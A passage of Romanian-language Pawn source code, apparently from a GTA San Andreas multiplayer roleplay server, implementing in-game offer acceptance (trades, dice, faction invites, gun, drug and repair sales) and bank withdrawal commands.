			AddFactionRaport(id, 0);				
			License[playerid] = 0;
			LicenseOffer[playerid] = -1;		
			SCMf(playerid, COLOR_MONEY, "Ai acceptat oferta lui %s si ai primit licenta.", GetName(id));
			SCMf(id, COLOR_MONEY, "%s ti-a acceptat oferta si ai primit $%s.", GetName(playerid), FormatNumber(money));
		}
		case _H<battle>: {
			if(CaseInvite[playerid]!=id) return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Acel player nu te-a invitat la o batalie.");
			if(!ProxDetectorS(10.0, playerid, id)) return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Acel player nu este langa tine.");
			if(player_selected[id]) return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Acel player este intr-o alta actiune.");
			if(PlayerInfo[playerid][pCaseBattle]<1) return SendClientMessage(playerid, COLOR_LGREEN, "Eorare: Nu ai case battle!");

			PlayerTextDrawSetPreviewModel(playerid, CasePTD[0], 12345);
			PlayerTextDrawSetPreviewModel(id, CasePTD[0], 12345);
			PlayerTextDrawSetPreviewModel(playerid, CasePTD[1], 12345);
			PlayerTextDrawSetPreviewModel(id, CasePTD[1], 12345);
			PlayerTextDrawSetString(playerid, CasePTD[2], "~y~loading..");
			PlayerTextDrawSetString(id, CasePTD[2], "~y~loading..");
			PlayerTextDrawSetString(playerid, CasePTD[3], "~y~loading..");
			PlayerTextDrawSetString(id, CasePTD[3], "~y~loading..");
			PlayerTextDrawSetString(playerid, CasePTD[4], GetName(playerid));
			PlayerTextDrawSetString(id, CasePTD[4], GetName(playerid));
			PlayerTextDrawSetString(playerid, CasePTD[5], GetName(id));
			PlayerTextDrawSetString(id, CasePTD[5], GetName(id));
			PlayerTextDrawSetPreviewModel(playerid, CasePTD[6], PlayerInfo[playerid][pModel]);
			PlayerTextDrawSetPreviewModel(id, CasePTD[6], PlayerInfo[playerid][pModel]);
			PlayerTextDrawSetPreviewModel(playerid, CasePTD[7], PlayerInfo[id][pModel]);
			PlayerTextDrawSetPreviewModel(id, CasePTD[7], PlayerInfo[id][pModel]);

			PlayerTextDrawSetString(playerid, CasePTD[8], "~y~loading.");
			PlayerTextDrawSetString(id, CasePTD[8], "~y~loading.");
			
			PlayerInfo[playerid][pCaseBattle]--;
			UpdateVar(playerid, "CaseBattle", PlayerInfo[playerid][pCaseBattle]);
			PlayerInfo[id][pCaseBattle]--;
			UpdateVar(id, "CaseBattle", PlayerInfo[id][pCaseBattle]);

			CaseInvite[playerid] = CaseInvite[id] = -1;

			CaseBattle[playerid] = id;
			CaseBattle[id] = playerid;
			CrateModel[playerid] = CrateModel[id] = 69;
			CrateTime[playerid] = CrateTime[id] = 16;
			player_selected[playerid] = player_selected[id] = 14;

			CaseType[playerid] = false;
			CaseType[id] = true;

			for(new i=0;i<3;i++) TextDrawShowForPlayer(playerid, CaseTD[i]);
			for(new i=0;i<9;i++) PlayerTextDrawShow(playerid, CasePTD[i]);
			for(new i=0;i<3;i++) TextDrawShowForPlayer(id, CaseTD[i]);
			for(new i=0;i<9;i++) PlayerTextDrawShow(id, CasePTD[i]);
		}
		case _H<trade>: {
			if(TradePlayer[playerid] == -1) return SendClientMessage(playerid, -1, "Nu ai primit o asemenea oferta.");
			if(TradePlayer[playerid] != id) return SendClientMessage(playerid, -1, "Acel player nu ti-a facut o oferta.");
			if(TradeMoney[playerid] > 2000000000) return SendClientMessage(playerid, COLOR_GREY, "Nu poti transfera o suma mai mare de $2.000.000.000!");
			if(GetPlayerInterior(playerid) != 0 || IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Nu poti face o afacere dintr-un interior sau vehicul!");
			if(GetPlayerInterior(id) != 0 || IsPlayerInAnyVehicle(id)) return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Nu poti face o afacere cu cineva ce se afla intr-un interior sau vehicul!");
			if(TradeID[playerid] != -1) return SendClientMessage(playerid, COLOR_WHITE, "Esti deja intr-o afacere!");
			if(TradeID[id] != -1) return SendClientMessage(playerid, COLOR_WHITE, "Acel player este deja intr-o afacere!");					
			TradePlayer[playerid] = -1;
			
			ShowTradeTDs(id);
			ShowTradeTDs(playerid);

			format(gString, 60, "Bunurile lui %s", GetName(id));
			PlayerTextDrawSetString(playerid, TradePTD[playerid][0], gString);
			PlayerTextDrawSetString(id, TradePTD[id][0], "Bunurile tale");
			PlayerTextDrawSetString(playerid, TradePTD[playerid][1], "Bunurile tale");
			format(gString, 60, "Bunurile lui %s", GetName(playerid));
			PlayerTextDrawSetString(id, TradePTD[id][1], gString);
			
			TradeItems[id] = 0;
			TradeItems[playerid] = 0;
			TradeReady[id] = 0;
			TradeReady[playerid] = 0;
			TradeID[id] = playerid;
			TradeID[playerid] = id;

			SCMf(id, COLOR_LIGHTBLUE, "%s (%d) a acceptat invitatia ta!", GetName(playerid), playerid);
			SCMf(playerid, COLOR_LIGHTBLUE, "Ai acceptat invitatia lui %s (%d)!", GetName(id), id);

			TradeType[id] = 1;
			TradeType[playerid] = 0;
		
			TextDrawHideForPlayer(id, TradeTD[9]);
			TextDrawHideForPlayer(id, TradeTD[10]);
			PlayerTextDrawHide(playerid, TradePTD[playerid][2]);
			PlayerTextDrawHide(playerid, TradePTD[playerid][3]);

			TradeAccepted[playerid] = 1;
			TradeAccepted[id] = 0;
			CarTrade[id] = -1;
			CarTrade[playerid] = -1;
		}
		case _H<dice>: {
			if(DiceID[playerid] == -1) 
				return SendClientMessage(playerid,COLOR_WHITE,"Nimeni nu te-a invitat sa joci barbut.");

			if(id == playerid) 
				return SendClientMessage(playerid, COLOR_GREY, "Nu poti folosi aceasta comanda asupra ta!");

			if(!PlayerToPoint(200, playerid, 2229.7744,1606.8580,1006.1860)) 
				return SendClientMessage(playerid, COLOR_GREY, "Nu te aflii intr-un casino.");
			
			if !IsPlayerConnected(id) *then
				return true;
				
			if(DiceID[playerid] != id)
				return SendClientMessage(playerid, COLOR_WHITE, "Acest player nu te-a invitat sa joci cu el barbut.");

			if(GetPlayerCash(playerid) < DiceMoney[playerid])
				return SendClientMessage(playerid,COLOR_WHITE,"Nu ai destui bani!");

			if(PlayerMoney(id, DiceMoney[playerid])) 
				return SendClientMessage(playerid,COLOR_WHITE,"Acest player nu are destui bani.");

			if(!ProxDetectorS(10.0, playerid, id)) 
				return SendClientMessage(playerid, COLOR_GREY, "Nu te aflii langa acel jucator!");

			new dice1[MAX_PLAYERS],dice2[MAX_PLAYERS];
			dice1[playerid] = random(12);
			dice2[DiceID[playerid]] = random (12);
			if(dice1[playerid] > dice2[DiceID[playerid]]) {
				format(gString, 128, "%s rolls %d. %s rolls %d. %s won $%s.", GetName(playerid), dice1[playerid], GetName(id), dice2[DiceID[playerid]], GetName(playerid), FormatNumber(DiceMoney[playerid]));
				ProxDetector(30.0,playerid, gString, COLOR_PURPLE);					
				CheckMission(playerid, 12);
				SCMf(playerid, COLOR_MONEY, "(+) Ai castigat $%s.", FormatNumber(DiceMoney[playerid]));
				SCMf(DiceID[playerid], COLOR_MONEY, "(-) Ai pierdut $%s.", FormatNumber(DiceMoney[playerid]));
				GivePlayerCash(playerid, DiceMoney[playerid]);
				GivePlayerCash(DiceID[playerid], -DiceMoney[playerid]);				
			}
			if(dice2[DiceID[playerid]] > dice1[playerid]) {
				format(gString, 128, "%s rolls %d. %s rolls %d. %s won $%s.", GetName(id), dice2[DiceID[playerid]], GetName(playerid), dice1[playerid], GetName(id), FormatNumber(DiceMoney[playerid]));
				ProxDetector(30.0,playerid, gString, COLOR_PURPLE);				
				SCMf(DiceID[playerid], COLOR_MONEY, "(+) Ai castigat $%s.", FormatNumber(DiceMoney[playerid]));
				CheckMission(DiceID[playerid], 12);
				SCMf(playerid, COLOR_MONEY, "(-) Ai pierdut $%s.", FormatNumber(DiceMoney[playerid]));
				GivePlayerCash(playerid, -DiceMoney[playerid]);
				GivePlayerCash(DiceID[playerid], DiceMoney[playerid]);
			}
			if(dice2[DiceID[playerid]] == dice1[playerid]) {
				SendClientMessage(DiceID[playerid], COLOR_MONEY, "Egal!");
				SendClientMessage(playerid, COLOR_MONEY, "Egal!");
			}
			DiceID[playerid] = -1;
			DiceMoney[playerid] = 0;
		}
		case _H<jobinvite>: {
			if(jobInvite[playerid]!=id)
				return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Acel player nu te-a invitat la job.");

			if(!ProxDetectorS(5.0, playerid, id))
				return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Acel player nu este langa tine.");

			if(jobWork[id]!=-1)
				return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Acel player munceste cu altcineva.");

			if(PlayerInfo[id][pJob]!=PlayerInfo[playerid][pJob])
				return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Nu aveti acelasi job.");


			jobInvite[playerid] = -1;
			jobInvite[id] = -1;

			jobWork[id] = playerid;
			jobWork[playerid] = id;

			SetPlayerColor(id, GetPlayerColor(playerid));
			SetPlayerColor(playerid, GetPlayerColor(id));

			SCMf(id, COLOR_LIGHTBLUE, "%s a acceptat invitatia trimisa de tine. Foloseste comanda (/work) pentru a incepe munca!", GetName(playerid));
			SCMf(playerid, COLOR_LIGHTBLUE, "Ai acceptat invitatia lui %s. Foloseste comanda (/work) pentru a incepe munca!", GetName(id));
		}
		case _H<invite>: {
			if(InvitedType[id] != 2) return SendClientMessage(playerid, -1, "N-ai fost invitat de cineva!");
			if(InvitedBy[id] != playerid) return SendClientMessage(playerid, -1, "Acel player nu te-a invitat.");
			if(PlayerInfo[playerid][pFpunish] != 0) return SendClientMessage(playerid,-1, "Ai FP!");
			InvitedBy[id] = -1;
			InvitedType[id] = 0;
			StartRaportLession(playerid);

			PlayerInfo[playerid][pMember] = PlayerInfo[id][pMember];
			Iter_Add(faction_players<PlayerInfo[playerid][pMember]>, playerid);
			PlayerInfo[playerid][pRank] = 1;		
			format(gString, 128, "%s has joined the faction %s (invited by %s).", PlayerInfo[playerid][pUsername], FactionName(PlayerInfo[playerid][pMember]), PlayerInfo[id][pUsername]);
			insertFactionLogs(id, playerid, gString);		
			
			SetPlayerToTeamColor(playerid);
			printf("AdmCmd: %s has invited %s to join %s.", GetName(playerid), GetName(id), FactionName(PlayerInfo[playerid][pMember]));
			format(gString, 128, "* %s joined the faction. (invited by %s)", GetName(id), GetName(playerid));
			SendFactionMessage(PlayerInfo[playerid][pMember], COLOR_LIGHTBLUE, gString);
			FactionMembers[PlayerInfo[playerid][pMember]] ++;
			SCMf(playerid, COLOR_LIGHTBLUE, "Ai acceptat invitatia liderului %s de a intra in factiunea %s.", GetName(playerid),FactionName(PlayerInfo[playerid][pMember]));
			if(IsACop(playerid) || PlayerInfo[playerid][pMember] == 13) finishAchievement(playerid, 12);
			else if(IsMafie(playerid)) finishAchievement(playerid, 13);
			else finishAchievement(playerid, 14);
			SCMf(id, COLOR_LIGHTBLUE, "%s a acceptat invitatia ta.", GetName(playerid));
			SetPlayerInterior(playerid,0);
			format(gString, sizeof gString, "%s, Joined the Faction.", PlayerInfo[playerid][pUsername]);
			factionLog(PlayerInfo[playerid][pMember], gString);
			_query("UPDATE users SET `Member`='%d',`Rank`='1' WHERE `ID`='%d'",PlayerInfo[playerid][pMember],PlayerInfo[playerid][pSQLID]);
		}
		case _H<cinvite>: {
			if(InvitedType[id] != 1) return SendClientMessage(playerid, -1, "N-ai fost invitat de cineva!");
			if(InvitedBy[id] != playerid) return SendClientMessage(playerid, -1, "Acel player nu te-a invitat.");

			new clanid = PlayerInfo[id][pClan];
			if(clanid == 0) return SendClientMessage(playerid, COLOR_GREY, "Nu ai nicio invitatie.");
			SendClientMessage(playerid, COLOR_LIGHTBLUE, "Ai acceptat cererea de intrare in clan.");

			format(gString, 128, "{%s}[CLAN] %s a acceptat invitatia de intrare in clan. (invited by %s)", ClanInfo[clanid][clColor], GetName(playerid), GetName(id));
			SendClanMessage(clanid, gString);
			PlayerInfo[playerid][pClan] = clanid;
			Iter_Add(clan_players<clanid>, playerid);
			ClanMembers[clanid] ++;
			PlayerInfo[playerid][pClanRank] = 1;
			InvitedType[id] = 0;
			InvitedBy[id] = -1;

			_query("UPDATE `users` SET `Clan`='%d', `ClanRank`='%d' WHERE `Name`='%s'", PlayerInfo[playerid][pClan], PlayerInfo[playerid][pClanRank], PlayerInfo[playerid][pUsername]);

			new clanid2 = PlayerInfo[playerid][pClan];

			if(strlen(PlayerInfo[playerid][pUsername])+strlen(ClanInfo[clanid][clTag]) < MAX_PLAYER_NAME) {
				PlayerInfo[playerid][pTag] = 0;
				UpdateVar(playerid, "Tag", 0);
				format(gString, 24, "%s%s", ClanInfo[clanid2][clTag], PlayerInfo[playerid][pUsername]);
				SetPlayerName(playerid, gString);
			}

			_query("UPDATE `users` SET `Clan`='%d', `ClanRank`='%d', `name_and_tag` = '%s%s' WHERE `Name`='%s'", PlayerInfo[playerid][pClan], PlayerInfo[playerid][pClanRank], GetName(playerid), ClanInfo[clanid2][clTag], PlayerInfo[playerid][pUsername]);
		}
		case _H<lawyer>: {
			if(AcceptOffer[playerid] == -1) 
				return SendClientMessage(playerid, COLOR_GREY, "Nu ai primit o oferta!");

			if(AcceptOffer[playerid] != id) 
				return SendClientMessage(playerid,-1, "Acel player nu ti-a oferit accept.");

			if(GetPlayerCash(playerid) < AcceptPrice[playerid]) 
				return SendClientMessage(playerid,COLOR_GREY, "Nu ai banii necesari.");

			PlayerInfo[playerid][pLawyer] += 15;
			PlayerInfo[AcceptOffer[playerid]][pLawyer] -= 15;
			GivePlayerCash(playerid, -AcceptPrice[playerid]);
			GivePlayerCash(AcceptOffer[playerid], AcceptPrice[playerid]);
			SCMf(AcceptOffer[playerid],COLOR_MONEY, "%s a acceptat oferta.",GetName(playerid));
			SCMf(playerid,COLOR_MONEY, "Ai cumparat accept de la %s.", GetName(id));
			AcceptOffer[playerid] = -1;
			AcceptPrice[playerid] = 0;
		}
		case _H<materials>: {
			if(MatsOffer[playerid] == -1) 
				return SendClientMessage(playerid, COLOR_GREY, "Nu ai primit o oferta!");

			if(MatsOffer[playerid] != id) 
				return SendClientMessage(playerid,-1, "Acel player nu ti-a oferit materials.");

			if(GetPlayerCash(playerid) < MatsPrice[playerid])
				return SendClientMessage(playerid,COLOR_GREY, "Nu ai banii necesari.");

			PlayerInfo[playerid][pMats] += MatsAmmo[playerid];
			PlayerInfo[MatsOffer[playerid]][pMats] -= MatsAmmo[playerid];
			GivePlayerCash(playerid, -MatsPrice[playerid]);
			GivePlayerCash(MatsOffer[playerid], MatsPrice[playerid]);
			SCMf(playerid,COLOR_MONEY, "Ai cumparat %d materiale pentru $%s de la %s.",MatsAmmo[playerid],FormatNumber(MatsPrice[playerid]), GetName(id));
			SCMf(MatsOffer[playerid],COLOR_MONEY,"%s a cumparat materialele tale pentru $%s.", GetName(playerid),FormatNumber(MatsPrice[playerid]));
			UpdateVar(playerid, "Materials", PlayerInfo[playerid][pMats]);
			UpdateVar(MatsOffer[playerid], "Materials", PlayerInfo[MatsOffer[playerid]][pMats]);
			MatsOffer[playerid] = -1;
			MatsAmmo[playerid] = 0;
			MatsPrice[playerid] = 0;
		}
		case _H<gun>: {
			if(SellgunOffer[playerid] == -1) 
				return SendClientMessage(playerid, COLOR_GREY, "Nu ai primit o oferta!");

			if(SellgunOffer[playerid] != id) 
				return SendClientMessage(playerid,-1, "Acel player nu ti-a oferit o arma.");

			if(GetPlayerCash(playerid) < SellgunPrice[playerid]) 
				return SendClientMessage(playerid,COLOR_GREY, "Nu ai banii necesari.");

			new 
				weaponid=SellgunID[playerid],ammo=SellgunAmmo[playerid],price=SellgunPrice[playerid],
				mats=SellgunMats[playerid],gunname[32],idoffer=SellgunOffer[playerid]
			;
			ServerWeapon(playerid,weaponid,ammo);
			PlayerInfo[idoffer][pMats] -= mats;
			GivePlayerCash(playerid, -price);
			GivePlayerCash(idoffer, price);
			UpdateVar(idoffer, "Materials", PlayerInfo[idoffer][pMats]);
			GetWeaponNameEx(weaponid,gunname,32);
			SCMf(idoffer, COLOR_GRAD1, "I-ai dat lui %s, un %s cu %d gloante, pentru %d materiale.", GetName(playerid) ,gunname, ammo,mats);
			SCMf(playerid, COLOR_GRAD1, "Ai primit un %s cu %d gloante pentru %s.", gunname, ammo, GetName(id));
			format(gString, 128, "* %s a creat o arma si i-a dat-o lui %s.", GetName(id), GetName(playerid));
			ProxDetector(30.0, playerid, gString, COLOR_PURPLE);
			SellgunOffer[playerid] = -1;
			SellgunPrice[playerid] = 0;
			SellgunMats[playerid] = 0;
			SellgunAmmo[playerid] = 0;
			SellgunID[playerid] = 0;
		}
		case _H<free>: {
			if(FreeOffer[playerid] == -1) 
				return SendClientMessage(playerid, COLOR_GREY, "Nu ai primit o oferta!");

			if(FreeOffer[playerid] != id) 
				return SendClientMessage(playerid,-1, "Acel player nu ti-a oferit free.");

			if(GetPlayerCash(playerid) < FreePrice[playerid]) 
				return SendClientMessage(playerid,COLOR_GREY, "Nu ai banii necesari.");

			if(PlayerInfo[id][pLawyer] < 1) 
				return SendClientMessage(playerid,-1, "Acel player nu are accept.");

			SCMf(FreeOffer[playerid], COLOR_LIGHTBLUE, "* I-ai dat free lui %s si l-ai scos din inchisoare.", GetName(playerid));
			SCMf(playerid, COLOR_LIGHTBLUE, "* Ai primit free de la %s si ai iesit din inchisoare.", GetName(id));
			PlayerInfo[playerid][pJailTime] = 1;
			PlayerInfo[FreeOffer[playerid]][pLawyer] -= 1;
			GivePlayerCash(playerid, -FreePrice[playerid]);
			GivePlayerCash(FreeOffer[playerid], FreePrice[playerid]);
			PlayerInfo[playerid][pJailed] = 1;
			_query("UPDATE users SET `Acceptpoints`='%d' WHERE `ID`='%d'",PlayerInfo[FreeOffer[playerid]][pLawyer],PlayerInfo[FreeOffer[playerid]][pSQLID]);
			FreeOffer[playerid] = 0;
			FreePrice[playerid] = 0;
		}
		case _H<ticket>: {
			if(TicketOffer[playerid] == -1) 
				return SendClientMessage(playerid, COLOR_GREY, "Nu ai primit o oferta!");

			if(TicketOffer[playerid] != id) 
				return SendClientMessage(playerid,-1, "Acel player nu ti-a oferit ticket.");

			if(!ProxDetectorS(5.0, playerid, TicketOffer[playerid])) 
				return SendClientMessage(playerid, -1, "Acel player nu este langa tine.");

			if(GetPlayerCash(playerid) < TicketMoney[playerid]) 
				return SendClientMessage(playerid, COLOR_LIGHTBLUE, "* Nu ai enough money.");

			SCMf(playerid, COLOR_MONEY, "* Ai platit amenda de $%d lui %s.", TicketMoney[playerid], GetName(id));
			SCMf(TicketOffer[playerid], COLOR_MONEY, "* %s a platit amenda in valoare de $%d.", GetName(playerid), TicketMoney[playerid]);
			GivePlayerCash(playerid, -TicketMoney[playerid]);
			GivePlayerCash(TicketOffer[playerid], TicketMoney[playerid]);
			TicketOffer[playerid] = 999;
			TicketMoney[playerid] = 0;
			AddFactionRaport(id, 1);
		}
		case _H<refill>: {
			if(RefillOffer[playerid] == -1) 
				return SendClientMessage(playerid, COLOR_GREY, "Nu ai primit o oferta!");

			if(RefillOffer[playerid] != id) 
				return SendClientMessage(playerid,COLOR_WHITE, "This player has not offered you refill.");

			if(GetPlayerCash(playerid) < RefillPrice[playerid])
				return SendClientMessage(playerid, COLOR_WHITE, "Nu ai banii necesari!");

			new car = gLastCar[playerid];
			DeelayCommand[id][6] = gettime()+30;	
			format(gString, 180, "TTC Dispatch: Tow Truck Member %s (%d) i-a alimentat masina lui %s (%d) pentru suma de %d$.", GetName(id), id, GetName(playerid), playerid, RefillPrice[playerid]);
			SendFactionMessage(8, COLOR_LIGHTBLUE, gString);		
			SCMf(playerid,COLOR_MONEY, "* Vehiculul tau a fost alimentat cu %d%s pentru $%d de mecanicul %s.", 100-Gas[car],"%%",RefillPrice[playerid],GetName(id));
			AddFactionRaport(id, 2);
			SCMf(RefillOffer[playerid], COLOR_MONEY, "* I-ai alimentat vehiculul lui %s pentru $%d.", GetName(playerid),RefillPrice[playerid]);
			GivePlayerCash(id, RefillPrice[playerid]);
			GivePlayerCash(playerid, -RefillPrice[playerid]);
			Gas[car] = 100; 
			RefillOffer[playerid] = -1;
			RefillPrice[playerid] = 0;
			OnePlayAnim(id, "BOMBER", "BOM_Plant", 4.0, 0, 0, 0, 0, 0);
		}
		case _H<live>: {
			if(LiveOffer[playerid] == -1) 
				return SendClientMessage(playerid, COLOR_GREY, "Nu ai primit o oferta!");

			if(LiveOffer[playerid] != id) 
				return SendClientMessage(playerid,COLOR_WHITE, "This player has not offered you live.");

			if(!ProxDetectorS(5.0, playerid, LiveOffer[playerid])) 
				return SendClientMessage(playerid, -1, "Acel player nu este langa tine.");

			SendClientMessage(playerid, COLOR_WHITE, "* Live-ul a inceput!");
			SendClientMessage(LiveOffer[playerid], COLOR_WHITE, "* Pentru a opri live-ul, foloseste comanda (/endlive) iar.");
			TalkingLive[playerid] = LiveOffer[playerid];
			TalkingLive[LiveOffer[playerid]] = playerid;
			PlayerInfo[playerid][pChatCMD] = 10;
			PlayerInfo[LiveOffer[playerid]][pChatCMD] = 10;
			PlayerTextDrawHide(playerid, ChatCMD);
			PlayerTextDrawHide(LiveOffer[playerid], ChatCMD);
			GivePlayerCash(LiveOffer[playerid], -1000000*PlayerInfo[LiveOffer[playerid]][pLevel]);
			GivePlayerCash(playerid, 1000000*PlayerInfo[LiveOffer[playerid]][pLevel]);
			LiveOffer[playerid] = -1;
		}
		case _H<drugs>: {
			if(DrugOffer[playerid] == -1) 
				return SendClientMessage(playerid, COLOR_GREY, "Nu ai primit o oferta!");

			if(DrugOffer[playerid] != id) 
				return SendClientMessage(playerid,COLOR_WHITE, "This player has not offered you drugs.");

			if(GetPlayerCash(playerid) < DrugPrice[playerid])
				return SendClientMessage(playerid, COLOR_WHITE, "Nu ai banii necesari!");

			if(PlayerInfo[playerid][pDrugs] > 50) 
				return SendClientMessage(playerid, COLOR_WHITE, "Ai prea multe droguri!");

			SCMf(playerid, COLOR_MONEY, "* Ai cumparat %d grame de droguri pentru $%d de la distribuitorul %s.",DrugGram[playerid],DrugPrice[playerid], GetName(id));
			SCMf(DrugOffer[playerid], COLOR_MONEY, "* %s a cumparat %d grame de droguri in schimbul sumei de $%d.",GetName(playerid),DrugGram[playerid],DrugPrice[playerid]);
			GivePlayerCash(DrugOffer[playerid],DrugPrice[playerid]);
			GivePlayerCash(playerid, -DrugPrice[playerid]);
			PlayerInfo[playerid][pDrugs] += DrugGram[playerid];
			PlayerInfo[DrugOffer[playerid]][pDrugs] -= DrugGram[playerid];
			UpdateVar(playerid, "Drugs", PlayerInfo[playerid][pDrugs]);
			UpdateVar(id, "Drugs", PlayerInfo[id][pDrugs]);
			DrugOffer[playerid] = 999;
			DrugPrice[playerid] = 0;
			DrugGram[playerid] = 0;
		}
		case _H<repair>: {
			if(RepairOffer[playerid] == -1) 
				return SendClientMessage(playerid, COLOR_GREY, "Nu ai primit o oferta!");

			if(RepairOffer[playerid] != id) 
				return SendClientMessage(playerid,COLOR_WHITE, "This player has not offered you repair.");

			if(GetPlayerCash(playerid) < RepairPrice[playerid]) 
				return SendClientMessage(playerid, COLOR_GREY, "Nu ai suficienti bani!");

			if(!IsPlayerInAnyVehicle(playerid)) 
				return SendClientMessage(playerid, COLOR_WHITE, "You can't afford the repair.");

			if(!IsPlayerConnected(RepairOffer[playerid])) 
				return SendClientMessage(playerid, COLOR_GREY, "That user is not connected.");

			RepairCar[playerid] = GetPlayerVehicleID(playerid);		
			RepairVehicle(RepairCar[playerid]);
			SetVehicleHealth(RepairCar[playerid], 998.0);
					
			DeelayCommand[id][5] = gettime()+30;
			format(gString, 128, "TTC Dispatch: Tow Truck Member %s (%d) i-a reparat masina lui %s (%d) pentru suma de %d$.", GetName(id), id, GetName(playerid), playerid, RepairPrice[playerid]);
			SendFactionMessage(8, COLOR_LIGHTBLUE, gString);
			SendFactionMessage(22, COLOR_LIGHTBLUE, gString);

			SCMf(playerid, COLOR_MONEY, "* Vehiculul tau a fost reparat pentru $%d de mecanicul %s.",RepairPrice[playerid], GetName(id));
			SCMf(RepairOffer[playerid], COLOR_MONEY, "* I-ai reparat vehiculul lui %s pentru $%d.",GetName(playerid),RepairPrice[playerid]);
			GivePlayerCash(RepairOffer[playerid],RepairPrice[playerid]);
			GivePlayerCash(playerid, -RepairPrice[playerid]);
			AddFactionRaport(id, 1);
			RepairOffer[playerid] = -1;
			RepairPrice[playerid] = 0;
			PlayerPlaySound(playerid,1133,0.0,0.0,0.0);		
			OnePlayAnim(id, "BOMBER", "BOM_Plant", 4.0, 0, 0, 0, 0, 0);	
		}
		default: {
			SendClientMessage(playerid, COLOR_GREY, "USAGE: {FFFFFF}/accept <item> <playerid/name>");
			SendClientMessage(playerid, COLOR_WHITE, "Trade, License, Dice, Drugs, Materials, Taxi,");
			SendClientMessage(playerid, -1, "Medic, Live, Free, Mecanic, Ticket, Refill, Invite, Lesson, Cinvite, Clan.");
		}
	}	
	return true;
}
cmd:invite(playerid, params[]) {
	if(!PlayerInfo[playerid][pMember]) 
		return true;

	if(PlayerInfo[playerid][pRank] < 6) 
		return SendClientMessage(playerid, -1, "Comanda aceasta este doar pentru lideri si sublideri.");

	new id;
	if(sscanf(params, "u", id)) 
		return SendClientMessage(playerid, COLOR_GREY, "USAGE: {FFFFFF}/invite <playerid/name>");

	if(!IsPlayerConnected(id)) 
		return SendClientMessage(playerid, COLOR_GREY, "That user is not connected.");

	if(!IsPlayerLogged(id)) 
		return SendClientMessage(playerid, COLOR_GREY, "Player not logged.");

	if(InvitedBy[playerid] == id)
		return SendClientMessage(playerid, COLOR_GREY, "I-ai mai trimis o invitatie la acelasi player!");

	if(PlayerInfo[id][pFpunish] != 0) 
		return SendClientMessage(playerid,-1, "Acel player are FP.");

	if(FactionMembers[PlayerInfo[playerid][pMember]] >= DynamicFactions[PlayerInfo[playerid][pMember]][fMaxMembers]) 
		return SendClientMessage(playerid, -1, "Ai numarul maxim de membrii in factiune.");

	if(!IsPlayerConnected(id)) 
		return SendClientMessage(playerid, COLOR_GREY, "That user is not connected.");

	if(PlayerInfo[id][pMember] != 0 || PlayerInfo[id][pLeader] != 0) 
		return SendClientMessage(playerid, -1, "Acel player face deja parte dintr-o factiune!");			

	SCMf(id, COLOR_LIGHTBLUE, "Lider %s te-a invitat in factiunea %s. (/accept invite %d)", GetName(playerid), FactionName(PlayerInfo[playerid][pMember]), playerid);
	SCMf(playerid, COLOR_LIGHTBLUE, "L-ai invitat pe %s in factiunea ta.", GetName(id));
	InvitedType[playerid] = 2;
	InvitedBy[playerid] = id;
	return true;
}
cmd:withdraw(playerid, params[]) {
    if(!IsAtBank(playerid)&&!is_zone_atm[playerid]) return SendClientMessage(playerid, COLOR_GREY, "Nu esti la banca sau in raza unui ATM.");
	new money,tax=0;
	if(LastPlayer==PlayerInfo[playerid][pSQLID]) return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Nu poti licita in timpul unei licitatie.");
	if(sscanf(params, "i", money)) return SendClientMessage(playerid, COLOR_GREY, "USAGE: {FFFFFF}/withdraw <Suma>");
	if(money<=0||money>800000000) return SendClientMessage(playerid, COLOR_WHITE, "Nu poti retrage mai mult de $800.000.000!");
	if(GetPlayerBank(playerid)<money) return SendClientMessage(playerid, COLOR_GRAD3, "Nu ai aceasta suma de bani!");
	tax = money/10;
	money -= is_zone_atm[playerid]?tax:0;
	GivePlayerCash(playerid, money);
	GivePlayerBank(playerid, -money);
	if is_zone_atm[playerid] *then {
		SCMf(playerid, 0xFAAC25FF, "ATM: You have withdrawn $%s (tax: $%s) from you bank account. Your account balance is now $%s.", FormatNumber(money), FormatNumber(tax), formatBytes(bank[playerid]));
	} else SCMf(playerid, 0xFAAC25FF, "You have withdrawn $%s from your bank account. You account balance is now $%s.", FormatNumber(money), formatBytes(bank[playerid]));
	SavePlayerBank(playerid);
	format(gString, sizeof gString, "A retras $%s din banca", FormatNumber(money));
	InsertLog(playerid, gString, LOG_MONEY);
	if(PlayerInfo[playerid][pShowBanca] == 1) {
		format(gString, 128, "$%s", formatBytes(bank[playerid]));
		PlayerTextDrawSetString(playerid, BancaTD, gString);
	}
	return true;
}
cmd:withdrawm(playerid, params[]) {
	if(PlayerInfo[playerid][pVip]<2) return true;
    if(!IsAtBank(playerid)) return SendClientMessage(playerid, COLOR_GREY, "Nu esti la banca.");
    if(LastPlayer==PlayerInfo[playerid][pSQLID]) return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Nu poti licita in timpul unei licitatie.");
	new money;
	if(sscanf(params, "i", money)) return SendClientMessage(playerid, COLOR_GREY, "USAGE: {FFFFFF}/withdrawm <miliarde>");
	if(money<=0||money>800000000) return SendClientMessage(playerid, COLOR_LGREEN, "Invalid miliards money!");
	if(ByteVar1@bank[playerid]<eBit:money) return SendClientMessage(playerid, COLOR_GRAD3, "Nu ai aceasta suma de bani!");
	ByteVar1@bank[playerid] -= eBit:money;
	SavePlayerBank(playerid);
	ByteVar1@money[playerid] += eBit:money;
	format(gString, sizeof gString, "A retras $%s.000.000.000 miliarde din banca", FormatNumber(money));
	InsertLog(playerid, gString, LOG_MONEY);
	SCMf(playerid, 0xFAAC25FF, "You have withdrawn $%d.000.000.000 from your bank account. You account balance is now $%s.", money, formatBytes(bank[playerid]));
	if(PlayerInfo[playerid][pShowBanca] == 1) {
		format(gString, 128, "$%s", formatBytes(bank[playerid]));
		PlayerTextDrawSetString(playerid, BancaTD, gString);
	}
	return true;
}
cmd:deposit(playerid, params[]) {
    if(!IsAtBank(playerid)) return SendErrorMsg(playerid, "Pentru a putea folosi aceasta comanda, trebuie sa fii intr-o banca!");
	extract params -> new money; else return SendUsageMsg(playerid, "deposit [amount]");
